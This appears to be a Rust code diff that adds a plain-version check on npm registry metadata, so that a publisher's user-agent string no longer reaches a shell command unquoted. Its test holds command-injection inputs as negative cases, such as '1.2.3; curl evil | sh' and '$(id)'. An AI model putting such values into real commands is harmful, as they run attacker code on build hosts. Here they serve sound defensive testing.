@@ -124,14 +124,23 @@ pub struct NpmInferrer {
     sources: Option<std::sync::Arc<crate::SourceCache>>,
 }
 
-/// Whether a recorded `_nodeVersion` names something a toolchain host actually serves.
+/// Whether a version string recorded by the registry is a plain `x.y.z`.
 ///
-/// Exactly three all-numeric components. `8.0.0-pre` fails on the third, which is the case this
-/// exists for: it is what a Node built from `master` reports before 8.0.0 is cut, and no
-/// distribution host ever carried it. io.js versions like `1.6.4` pass, because they are real
-/// releases — `npm/install-node` routes majors 1 to 3 to iojs.org and gets the publisher's own
-/// binary, so those need no substitution at all.
-fn is_fetchable_node(version: &str) -> bool {
+/// Exactly three all-numeric components, and the gate on two different fields for two different
+/// reasons.
+///
+/// `_nodeVersion`: `8.0.0-pre` fails on the third component, which is what a Node built from
+/// `master` reports before 8.0.0 is cut, and no distribution host ever carried it. io.js versions
+/// like `1.6.4` pass, because they are real releases — `npm/install-node` routes majors 1 to 3 to
+/// iojs.org and fetches the publisher's own binary.
+///
+/// `_npmVersion`: the field is whatever the publishing client put there, and a publishing client is
+/// not always npm. `framer-motion@12.36.0` records
+/// `lerna/4.0.0/node@v22.14.0+arm64 (darwin)` — a user-agent string. That reached
+/// `npm install -g npm@…` unquoted and the parenthesis ended the deps phase with
+/// `Syntax error: "(" unexpected`, filed as `unknown` and charged to the package. A value that is
+/// not a version cannot be installed, so there is nothing to salvage and the rung declines.
+fn is_plain_version(version: &str) -> bool {
     let numeric =
         |p: Option<&str>| p.is_some_and(|s| !s.is_empty() && s.bytes().all(|b| b.is_ascii_digit()));
     let mut parts = version.split('.');
@@ -186,7 +195,7 @@ async fn highest_node_release_at(client: &Client, instant: &str) -> Option<Strin
                 .is_some_and(|f| f.iter().any(|x| x.as_str() == Some("linux-x64")))
         })
         .filter_map(|e| e["version"].as_str()?.strip_prefix('v'))
-        .filter(|v| is_fetchable_node(v))
+        .filter(|v| is_plain_version(v))
         .max_by_key(|v| node_order(v))
         .map(str::to_string)
 }
@@ -285,6 +294,18 @@ impl StrategyInferrer for NpmInferrer {
             );
             return Ok(Vec::new());
         };
+        // **`_npmVersion` is whatever the publishing client wrote, and it is not always a version.**
+        // Unlike `_nodeVersion` there is no substitution to make: a user-agent string names no npm
+        // release, and the publisher's actual npm is not recoverable from it. Declining says that;
+        // passing it on produced a shell syntax error inside our own deps script and reported the
+        // package as broken.
+        if !is_plain_version(&npm) {
+            tracing::debug!(
+                npm,
+                "the registry recorded a publishing client rather than an npm version; declining"
+            );
+            return Ok(Vec::new());
+        }
 
         // **A `_nodeVersion` no host serves, replaced by the nearest one that does.** The publisher
         // used a Node built from master — `isexe@2.0.0` records `8.0.0-pre` — and nodejs.org never
@@ -294,7 +315,7 @@ impl StrategyInferrer for NpmInferrer {
         //
         // The npm that packs the tarball is still the recorded one, and that is the half that
         // shapes the artifact: `npm pack`'s manifest rewrite is npm's behaviour, not Node's.
-        let node = if is_fetchable_node(&node) {
+        let node = if is_plain_version(&node) {
             node
         } else {
             let Some(publish) = target.intrinsics.publish_time.as_deref() else {
@@ -1573,15 +1594,43 @@ mod nuget_package_id_tests {
 
 #[cfg(test)]
 mod node_substitution_tests {
-    use super::{is_fetchable_node, node_order};
+    use super::{is_plain_version, node_order};
 
     /// What counts as a version a toolchain host will serve.
     ///
     /// `isexe@2.0.0` records `8.0.0-pre` — the string a Node built from master reports before 8.0.0
     /// is cut. Nothing ever distributed it, so the fetch 404s at every egress tier.
+    /// A publishing client is not a version, and it must not reach a shell.
+    ///
+    /// `framer-motion@12.36.0` records `_npmVersion: "lerna/4.0.0/node@v22.14.0+arm64 (darwin)"`.
+    /// Spliced unquoted into `npm install -g npm@…` the parenthesis ended the deps phase with
+    /// `Syntax error: "(" unexpected`, which classified as `unknown` — `Fault::Build` — and charged
+    /// a shell bug of ours to the package.
+    #[test]
+    fn a_publishing_client_string_is_not_a_version() {
+        for ua in [
+            "lerna/4.0.0/node@v22.14.0+arm64 (darwin)",
+            "npm/10.9.2 node/v22.14.0 linux x64 workspaces/false",
+            "yarn/1.22.19",
+            // The shape that makes this worth a rung check rather than only quoting.
+            "1.2.3; curl evil | sh",
+            "$(id)",
+            "`id`",
+            "1.2.3'",
+        ] {
+            assert!(
+                !is_plain_version(ua),
+                "{ua} must not be treated as a version"
+            );
+        }
+        for real in ["4.4.2", "10.9.2", "2.8.3"] {
+            assert!(is_plain_version(real), "{real} is a version");
+        }
+    }
+
     #[test]
     fn a_pre_release_is_not_fetchable_and_a_real_release_is() {
-        assert!(!is_fetchable_node("8.0.0-pre"), "the case this exists for");
+        assert!(!is_plain_version("8.0.0-pre"), "the case this exists for");
         for odd in [
             "8.0.0-nightly20170323ee19e2923a",
             "8.0.0-rc.1",
@@ -1590,7 +1639,7 @@ mod node_substitution_tests {
             "8",
             "",
         ] {
-            assert!(!is_fetchable_node(odd), "{odd} is not an x.y.z release");
+            assert!(!is_plain_version(odd), "{odd} is not an x.y.z release");
         }
 
         // io.js versions are real releases and must NOT be substituted: `npm/install-node` routes
@@ -1599,7 +1648,7 @@ mod node_substitution_tests {
         for real in [
             "1.6.4", "2.5.0", "3.3.1", "0.12.7", "4.8.1", "7.7.4", "22.14.0",
         ] {
-            assert!(is_fetchable_node(real), "{real} is a release we can fetch");
+            assert!(is_plain_version(real), "{real} is a release we can fetch");
         }
     }
 
